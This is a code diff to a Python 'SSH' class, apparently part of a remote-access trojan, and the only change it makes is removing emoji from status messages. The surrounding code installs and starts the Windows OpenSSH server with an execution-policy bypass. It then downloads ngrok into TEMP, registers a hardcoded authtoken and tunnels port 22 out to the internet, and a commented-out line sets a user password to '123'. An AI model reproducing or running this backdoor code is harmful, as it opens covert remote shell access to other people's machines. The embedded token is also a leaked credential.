@@ -22,16 +22,16 @@ class SSH():
 			self.Ngrok()
 			#self.Change_Password()
 		else:
-			self.SendMessage("✖️ Need Admin Permissions.")
+			self.SendMessage("Need Admin Permissions.")
 
 	def Install_SSH(self):
-		self.SendMessage("📌 Installing SSH...")
+		self.SendMessage("Installing SSH...")
 		os.system('powershell.exe -ExecutionPolicy Bypass -c "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"')
 		os.system('powershell.exe -ExecutionPolicy Bypass -c "Start-Service sshd"')
-		self.SendMessage("✔️ SSH Installed")
+		self.SendMessage("SSH Installed")
 
 	def Ngrok(self):
-		self.SendMessage("📌 Donwloading Ngrok...")
+		self.SendMessage("Donwloading Ngrok...")
 		req = requests.get(self.ngrok)
 		
 		filename = os.environ['TEMP'] + "\\ngrok.zip"
@@ -44,7 +44,7 @@ class SSH():
 		Popen([os.environ['TEMP'] + "\\ngrok.exe","authtoken","27D5cTLjSznClCfArRRGjs2os83_6Ps5YmFqGTfUVZgvnR7e1"])
 		Popen([os.environ['TEMP'] + "\\ngrok.exe","tcp","22"])
 		#shell.ShellExecuteEx(lpFile=os.environ['TEMP'] + "\\ngrok.exe", lpParameters="tcp 22")
-		self.SendMessage("✔ Ngrok Executed.")
+		self.SendMessage("Ngrok Executed.")
 
 	def Change_Password(self):
 		Popen(["net","user","RA3D","123"])
